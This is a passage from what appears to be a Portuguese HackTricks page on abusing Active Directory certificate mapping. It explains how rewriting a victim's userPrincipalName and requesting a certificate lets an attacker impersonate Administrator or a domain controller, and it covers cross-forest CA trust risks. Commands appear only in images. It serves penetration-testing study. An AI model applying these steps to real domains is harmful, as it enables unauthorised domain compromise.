<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

Isso não é uma violação de restrição, já que o `userPrincipalName` do usuário `Administrator` é `Administrator@corp.local` e não `Administrator`.

Agora, solicitamos qualquer certificado que permita autenticação de cliente, por exemplo, o modelo padrão `User`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Observe que o `userPrincipalName` no certificado é `Administrator`.

Então, mudamos de volta o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Agora, se tentarmos nos autenticar com o certificado, receberemos o hash NT do usuário `Administrator@corp.local`. Você precisará adicionar `-domain <domain>` à sua linha de comando, já que não há domínio especificado no certificado.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Caso de Abuso 2

* `CertificateMappingMethods` contém a flag de bit `UPN` (`0x4`)
* `GenericWrite` sobre qualquer conta A para comprometer qualquer conta B sem uma propriedade `userPrincipalName` (contas de máquina e administrador de domínio integrado `Administrator`)

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local`, e desejamos comprometer o controlador de domínio `DC$@corp.local`.

Primeiro, obtemos o hash de `Jane` com, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Em seguida, mudamos o `userPrincipalName` de `Jane` para ser `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Isso não é uma violação de restrição, já que a conta de computador `DC$` não tem `userPrincipalName`.

Agora, solicitamos qualquer certificado que permita autenticação de cliente, por exemplo, o modelo padrão `User`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

Então, mudamos de volta o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Agora, como essa chave de registro se aplica ao Schannel, devemos usar o certificado para autenticação via Schannel. É aqui que entra a nova opção `-ldap-shell` do Certipy.

Se tentarmos nos autenticar com o certificado e `-ldap-shell`, notaremos que estamos autenticados como `u:CORP\DC$`. Esta é uma string enviada pelo servidor.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

Um dos comandos disponíveis para o shell LDAP é `set_rbcd`, que definirá a Delegação Restrita Baseada em Recursos (RBCD) no alvo. Assim, poderíamos realizar um ataque RBCD para comprometer o controlador de domínio.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternativamente, também podemos comprometer qualquer conta de usuário onde não há `userPrincipalName` definido ou onde o `userPrincipalName` não corresponde ao `sAMAccountName` dessa conta. De acordo com meus próprios testes, o administrador de domínio padrão `Administrator@corp.local` não tem um `userPrincipalName` definido por padrão, e essa conta deve ter por padrão mais privilégios no LDAP do que os controladores de domínio.

## Comprometendo Florestas com Certificados

### Confianças de CAs Quebrando Confianças de Florestas

A configuração para **inscrição entre florestas** é relativamente simples. Os administradores publicam o **certificado da CA raiz** da floresta de recursos **para as florestas de contas** e adicionam os certificados da **CA empresarial** da floresta de recursos aos contêineres **`NTAuthCertificates`** e AIA **em cada floresta de contas**. Para ser claro, isso significa que a **CA** na floresta de recursos tem **controle total** sobre todas as **outras florestas que gerencia PKI para**. Se os atacantes **comprometerem essa CA**, eles podem **forjar certificados para todos os usuários nas florestas de recursos e de contas**, quebrando o limite de segurança da floresta.

### Principais Estrangeiros Com Privilégios de Inscrição

Outra coisa que as organizações precisam ter cuidado em ambientes multi-floresta é CAs Empresariais **publicando modelos de certificados** que concedem a **Usuários Autenticados ou principais estrangeiros** (usuários/grupos externos à floresta à qual a CA Empresarial pertence) **direitos de inscrição e edição**.\
Quando uma conta **se autentica através de uma confiança**, o AD adiciona o SID de **Usuários Autenticados** ao token do usuário autenticado. Portanto, se um domínio tem uma CA Empresarial com um modelo que **concede direitos de inscrição a Usuários Autenticados**, um usuário em uma floresta diferente poderia potencialmente **se inscrever no modelo**. Da mesma forma, se um modelo concede explicitamente a um **principal estrangeiro direitos de inscrição**, então uma **relação de controle de acesso entre florestas é criada**, permitindo que um principal em uma floresta **se inscreva em um modelo em outra floresta**.

Em última análise, ambos os cenários **aumentam a superfície de ataque** de uma floresta para outra. Dependendo das configurações do modelo de certificado, um atacante poderia abusar disso para obter privilégios adicionais em um domínio estrangeiro.

## Referências

* Todas as informações para esta página foram retiradas de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
